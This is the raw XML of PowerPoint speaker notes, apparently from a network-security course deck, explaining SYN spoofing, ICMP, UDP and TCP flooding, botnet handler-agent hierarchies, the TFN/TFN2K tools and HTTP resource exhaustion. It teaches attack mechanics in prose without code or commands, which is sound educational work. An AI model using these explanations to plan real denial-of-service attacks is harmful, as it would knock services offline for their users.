        <p:nvSpPr>
          <p:cNvPr id="22531" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF4CC379-B0BD-4A60-86B1-8E137575C2AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22532" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{559D5E04-B6DC-43AE-9752-D2D4700B1490}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>In order to increase the usage of the known TCP connections table, the attacker ideally wishes to use addresses that will not respond to the SYN-ACK with a RST. This can be done by overloading the host that owns the chosen spoofed source address, or by simply using a wide range of random addresses. In this case, the attacker relies on the fact that there are many unused addresses on the Internet. Consequently a reasonable proportion of randomly generated addresses will not correspond to a real host.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>There is a significant difference in the volume of network traffic between a SYN spoof attack, and the basic flooding attack we discussed. The actual volume of SYN traffic can be comparatively low, nowhere near the maximum capacity of the link to the server. It simply has to be high enough to keep the known TCP connections table filled. Unlike the flooding attack, this means the attacker does not need access to a high volume network connection. In the network shown in Figure 8.1, the medium sized organization, or even a broadband home user, could successfully attack the large company server using a SYN spoofing attack.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="178730278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EF26B470-40DB-48C6-9A1E-6EBC2C995F98}"/>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6C9392F7-01F7-4A5C-B97A-EE7D7E72A97B}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>160</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24579" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{059BC011-7F2B-4214-98C5-6DA54E7D7EF9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24580" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E60F5631-2838-46D4-9944-C651932E2155}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Flooding attacks take a variety of forms, based on which network protocol is being used to implement the attack. Common flooding attacks use any of the ICMP, UDP or TCP SYN packet types. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>An ICMP flooding attack uses an ICMP packet, such as ICMP echo request packets in a ping flood. This type of ICMP packet was chosen since traditionally network administrators allowed such packets into their networks. More recently, many organizations have restricted the ability of these packets to pass through their firewalls. In response, attackers have started using other ICMP packet types. Since some of these should be handled to allow the correct operation of TCP/IP, they are much more likely to be allowed through an organization’s firewall. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>An alternative to using ICMP packets is to use UDP packets directed to some port number, and hence potential service, on the target system. Spoofed source addresses are normally used if the attack is generated using a single source system, for the same reasons as with ICMP attacks. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Another alternative is to send TCP packets to the target system. Most likely these would be normal TCP connection requests, with either real or spoofed source addresses. In this case, it is the total volume of packets that is the aim of the attack, rather than specifically targeting the system code. This is the difference between a SYN spoofing attack and a SYN flooding attack. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24477561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EF26B470-40DB-48C6-9A1E-6EBC2C995F98}"/>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6C9392F7-01F7-4A5C-B97A-EE7D7E72A97B}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>161</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24579" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{059BC011-7F2B-4214-98C5-6DA54E7D7EF9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24580" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E60F5631-2838-46D4-9944-C651932E2155}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Flooding attacks take a variety of forms, based on which network protocol is being used to implement the attack. Common flooding attacks use any of the ICMP, UDP or TCP SYN packet types. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>An ICMP flooding attack uses an ICMP packet, such as ICMP echo request packets in a ping flood. This type of ICMP packet was chosen since traditionally network administrators allowed such packets into their networks. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>More recently, many organizations have restricted the ability of these packets to pass through their firewalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>. In response, attackers have started using other ICMP packet types. Since some of these should be handled to allow the correct operation of TCP/IP, they are much more likely to be allowed through an organization’s firewall. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>An alternative to using ICMP packets is to use UDP packets directed to some port number, and hence potential service, on the target system. Spoofed source addresses are normally used if the attack is generated using a single source system, for the same reasons as with ICMP attacks. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Another alternative is to send TCP packets to the target system. Most likely these would be normal TCP connection requests, with either real or spoofed source addresses. In this case, it is the total volume of packets that is the aim of the attack, rather than specifically targeting the system code. This is the difference between a SYN spoofing attack and a SYN flooding attack. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="281999750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common choice was a</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>packet directed at the diagnostic echo service, commonly enabled on many server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>systems by default. If the server had this service running, it would respond with a</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>UDP packet back to the claimed source containing the original packet data contents. If the service is not running, then the packet is discarded, and possibly an</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>ICMP destination unreachable packet is returned to the sender.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>162</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="278779251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EF26B470-40DB-48C6-9A1E-6EBC2C995F98}"/>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6C9392F7-01F7-4A5C-B97A-EE7D7E72A97B}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>163</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24579" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{059BC011-7F2B-4214-98C5-6DA54E7D7EF9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24580" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E60F5631-2838-46D4-9944-C651932E2155}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Flooding attacks take a variety of forms, based on which network protocol is being used to implement the attack. Common flooding attacks use any of the ICMP, UDP or TCP SYN packet types. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>An ICMP flooding attack uses an ICMP packet, such as ICMP echo request packets in a ping flood. This type of ICMP packet was chosen since traditionally network administrators allowed such packets into their networks. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>More recently, many organizations have restricted the ability of these packets to pass through their firewalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>. In response, attackers have started using other ICMP packet types. Since some of these should be handled to allow the correct operation of TCP/IP, they are much more likely to be allowed through an organization’s firewall. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>An alternative to using ICMP packets is to use UDP packets directed to some port number, and hence potential service, on the target system. Spoofed source addresses are normally used if the attack is generated using a single source system, for the same reasons as with ICMP attacks. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Another alternative is to send TCP packets to the target system. Most likely these would be normal TCP connection requests, with either real or spoofed source addresses. In this case, it is the total volume of packets that is the aim of the attack, rather than specifically targeting the system code. This is the difference between a SYN spoofing attack and a SYN flooding attack. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="254302231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A8CE65AC-EC64-477C-ABA4-EDA05E9B7B21}"/>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0EBDABA-8D55-4C38-93E4-E99BB012B2B0}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>164</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27651" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E873FAF-44AF-4E3B-8DE0-9750B6409AB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27652" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5825F6ED-6110-4E60-9E1E-A24A4B59C11F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>All of these flooding attack variants are limited in the total volume of traffic that can be generated if just a single system is used to launch the attack. By using multiple systems, the attacker can significantly scale up the volume of traffic that can be generated. Each of these systems need not be particularly powerful, or on a high capacity link. But what they don’t have individually, they more than compensate for in large numbers. These systems were typically compromised user workstations or PC’s. The attacker used some well-known flaw in the operating system or in some common application, to gain access to these systems, and to install their own programs on it. Such systems are known as “zombies”. Once suitable “backdoor” programs were installed on these systems, they were entirely under the attacker’s control. Large collections of such systems under the control of one attacker can be created, collectively forming a “botnet”. One of the earliest and best known DDoS tools is Tribe Flood Network (TFN), written by the hacker known as Mixter. The original variant from the 1990’s exploited Sun Solaris systems. It was later rewritten as Tribe Flood Network 2000 (TFN2K), and could run on UNIX, Solaris, and Windows NT systems. The agent was a Trojan program that was copied to, and run on compromised, zombie systems. It was capable of implementing ICMP flood, SYN flood, UDP flood, and ICMP amplification forms of denial of service attacks. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="56509290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id="{13BD3EBC-BB65-41F3-8A25-8F3FBBBBC09F}"/>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BBB9BDE0-4F22-439F-95E5-89B067853AB5}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>165</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29699" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31C5D523-C4F6-409B-9288-9BA2659CB0CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29700" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D494AE97-5BDC-4AEE-B1C1-963EAA8481C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Whilst the attacker could command each zombie individually, more generally a control hierarchy is used. A small number of systems act as handlers controlling a much larger number of agent systems, as shown in Figure 8.4. There are a number of advantages to this arrangement. The attacker can send a single command to a handler, which then automatically forwards it to all the agents under its control. Automated infection tools can also be used to scan for and compromise suitable zombie systems. Once the agent software is uploaded to a newly compromised system, it can contact one or more handlers to automatically notify them of its availability. By this means, the attacker can automatically grow suitable “botnets”. TFN and TFN2K use a version of this two-layer command hierarchy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The best defense against being an unwitting participant in a DDoS attack is to prevent your systems from being compromised. For the target of a DDoS attack, the response is the same as for any flooding attack, but with greater volume and complexity. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="325931715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0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>For example, an HTTP request to download a large file from the target</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>causes the Web server to read the file from hard disk, store it in memory, convert it</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>into a packet stream, and then transmit the packets. This process consumes memory,</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>processing, and transmission resources.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>168</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1982542722"/>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0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>For example, an HTTP request to download a large file from the target</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
